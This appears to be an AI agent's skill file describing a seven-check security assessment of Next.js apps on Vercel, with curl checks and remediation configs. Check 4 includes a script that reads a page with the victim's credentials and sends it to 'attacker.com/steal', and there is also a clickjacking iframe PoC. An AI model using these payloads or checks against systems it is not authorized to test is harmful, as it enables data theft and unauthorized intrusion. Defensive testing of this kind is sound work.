---
name: nextjs-vercel-security-assessment
description: >
  Security assessment methodology specific to Next.js applications deployed on
  Vercel — covers SSR vs client auth gaps, Vercel Blob storage exposure,
  missing security headers, CORS wildcard misconfig, rate limiting on
  serverless functions, subdomain enumeration, and exploit-validated reporting
  with real PoC code.
version: 1.0
author: hermes-agent
license: MIT
platforms: [linux, macos]
category: security
triggers:
  - "nextjs pentest [URL]"
  - "vercel security check [URL]"
  - "audit nextjs app [URL]"
  - "test vercel deployment [URL]"
  - "next.js vulnerability scan [URL]"
metadata:
  hermes:
    tags: [nextjs, vercel, security, pentest, saas, react, serverless]
    category: security
---

# Next.js + Vercel Security Assessment

## When to Use

Trigger this skill when the target is a **Next.js application deployed on Vercel**. The fingerprint is `x-powered-by: Next.js` + `server: Vercel` headers. This ecosystem has unique attack surface that general web-pentest skills miss:

- **Server-side SPA shell** served to unauthenticated users (auth in client JS only)
- **Vercel Blob storage** commonly left as `public` — direct object access
- **No built-in security headers** — Vercel edge has no nginx layer
- **Serverless functions** with no rate limiting by default
- **RSC (React Server Components)** exposing internal state
- **Multiple subdomains** for internal services (n8n, staging, APIs)

---

## 7-Check Methodology

Run these 7 checks in order. Each has a validation command and a PoC.

### Check 1: Server-Side Auth Enforcement

The classic Next.js auth gap: protected routes serve the SPA shell (200 OK) to anyone. Auth runs only in JavaScript.

```bash
for page in dashboard create billing library admin settings; do
  curl -sL -o /dev/null -w "/$page → HTTP %{http_code} (%{size_download}B)\n" --max-time 5 "https://target.com/$page"
done
```

**Vulnerable:** All return 200 with 20-50KB of HTML
**Secure:** Returns 302 (redirect) or 401

**PITFALL:** Some Next.js apps use middleware.ts for auth but still return 200 with an auth form embedded — check the response body for login vs dashboard content.

**PoC:** `curl -sL https://target.com/dashboard | grep -i "login\|signin\|dashboard"` — if you see login form when you expected dashboard, the route is properly protected. If you see dashboard shell, it's not.

### Check 2: Vercel Blob Storage — Direct Access

Vercel Blob defaults to `access: 'public'` in many tutorials. Media files are directly downloadable with no auth.

```bash
# Find blob URLs from page source
curl -s https://target.com/share/SOME-ID | grep -oP 'https?://[a-z0-9]+\.public\.blob\.vercel-storage\.com[^"'"'"']+'

# Verify direct access
curl -sI "https://XXXX.public.blob.vercel-storage.com/path/file.mp4"
```

**Vulnerable:** HTTP 200 with `content-type: video/mp4`
**Secure:** HTTP 403 or signed URL with expiry timestamp

**PoC:**
```bash
curl -sI "https://XXXX.public.blob.vercel-storage.com/reels/{uuid}/video-{timestamp}.mp4"
# → HTTP 200, no auth header needed, cached for 30 days
```

### Check 3: Security Headers Audit

Vercel deployments ship with no security headers by default — no nginx/Apache layer to add them.

```bash
curl -sI https://target.com | grep -i "x-frame-options\|content-security-policy\
\|x-content-type-options\|referrer-policy\|strict-transport-security"
```

**Commonly missing:**
- `X-Frame-Options` → Clickjacking
- `Content-Security-Policy` → Full XSS impact
- `X-Content-Type-Options: nosniff` → MIME sniffing

**Fix:** Add headers via `vercel.json` or `next.config.js`:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Content-Security-Policy", "value": "default-src 'self';" }
      ]
    }
  ]
}
```

**Clickjacking PoC:**
```html
<iframe src="https://target.com/dashboard" width="800" height="600"></iframe>
```

### Check 4: CORS Wildcard

Vercel sets `Access-Control-Allow-Origin: *` on many endpoints by default, especially blob storage.

```bash
curl -sI -H "Origin: https://evil.com" https://target.com | grep -i "access-control"
```

**Vulnerable:** `access-control-allow-origin: *` (any site can read)
**Secure:** Specific origin or no CORS header

**Data exfil PoC:**
```html
<script>
fetch('https://target.com/', { credentials: 'include' })
  .then(r => r.text())
  .then(t => fetch('https://attacker.com/steal?d=' + btoa(t)));
</script>
```

### Check 5: Rate Limiting

Vercel serverless functions have zero built-in rate limiting.

```bash
for i in $(seq 1 10); do
  curl -sL -o /dev/null -w "%{http_code}\n" --max-time 3 "https://target.com/signup"
done
```

**Vulnerable:** All 10+ return 200
**Secure:** Returns 429 after 3-5 attempts

**Fix:** Vercel Edge rate limiting or Vercel WAF rules.

### Check 6: Subdomain Enumeration

Next.js/Vercel projects commonly have multiple subdomains for internal services.

```bash
export PATH=$HOME/go/bin:$PATH
subfinder -d target.com -silent

# Common Vercel subdomain names to check
for sub in www api dev staging admin app cdn blog mail test \
           vms n8n devcollab invoice-backend incubyte-assignment; do
  dig +short "$sub.target.com" 2>/dev/null | grep -v "^$"
done
```

**High-value targets:** `n8n`, `api`, `devcollab`, `invoice-backend` — often lack auth when they come online.

### Check 7: Information Disclosure

```bash
curl -sL https://target.com/robots.txt
curl -sL https://target.com/sitemap.xml

# Common Vercel Next.js leaks:
# - __NEXT_DATA__ script tag (SSR state)
# - Build ID in HTML/JS
# - RSC payload via ?_rsc=1
# - Server Action IDs in forms ($ACTION_ID_*)
```

---

## Exploit-Validated Report Template

Every finding in the report MUST include:

```markdown
## F{N}: Finding Title
**Severity:** [CRITICAL/HIGH/MEDIUM/LOW] | **CVSS:** X.X | **CWE:** CWE-XXX

### Exploit Validation
```bash
$ curl command showing the vulnerability
```

### Real PoC
```html or bash
Copy-paste executable proof
```

### Attack Scenario
1. Step-by-step exploitation flow
2. Real-world impact

### Remediation
Exact code/config change to fix
```

### Report Structure
1. **Executive Summary** — what was found, risk matrix  
2. **Findings** — each with validation + PoC + remediation (MEDIUM + above)  
3. **Clean Check Results** — what was tested and found safe  
4. **Fix Commands** — copy-paste code for the developer  

---

## Clean Check Reference (Next.js/Vercel)

| Check | Typical Result | Rationale |
|-------|---------------|-----------|
| SQL Injection | ✅ SAFE | Next.js params are framework-routed, not SQL-queried |
| Reflected XSS | ✅ SAFE | React auto-escapes template output |
| Stored XSS | ✅ SAFE | Rarely user-content fields in these apps |
| SSRF via OG Image | ✅ SAFE | `/opengraph-image` returns static image |
| Path Traversal | ✅ BLOCKED | Vercel Edge returns 403 |
| GraphQL | 🔍 NOT EXPOSED | Unless custom-built |
| Source Maps | ✅ BLOCKED | Vercel blocks `*.js.map` |
| API Keys in JS | 🔍 CHECK | Rarely found but always inspect bundles |

---

## Quick Command Pipeline

```bash
# Full passive recon in one shot
echo "=== TARGET: target.com ==="
echo "---Tech Fingerprint---"
whatweb -v https://target.com 2>&1 | grep -E "Status|Title|IP|Country|HTTPServer|Detected"
echo "---Headers---"
curl -sIk https://target.com
echo "---Robots---"
curl -sL https://target.com/robots.txt
echo "---Sitemap---"
curl -sL https://target.com/sitemap.xml | grep -oP '<loc>[^<]+</loc>' | head -30
echo "---CORS---"
curl -sI -H "Origin: https://evil.com" https://target.com | grep -i "access-control"
echo "---Subdomains---"
subfinder -d target.com -silent 2>/dev/null
echo "---Auth Bypass Check---"
for p in dashboard create billing library admin; do
  curl -sL -o /dev/null -w "/$p → HTTP %{http_code}\n" --max-time 5 "https://target.com/$p"
done
echo "---Rate Limiting---"
for i in 1 2 3 4 5; do
  curl -sL -o /dev/null -w "%{http_code} " --max-time 3 "https://target.com/signup"
done
echo ""
```

---

## References

See `references/nextjs-vercel-playbook.md` for the full detailed playbook with extended PoC code, attack scenarios, and remediation commands for each check.
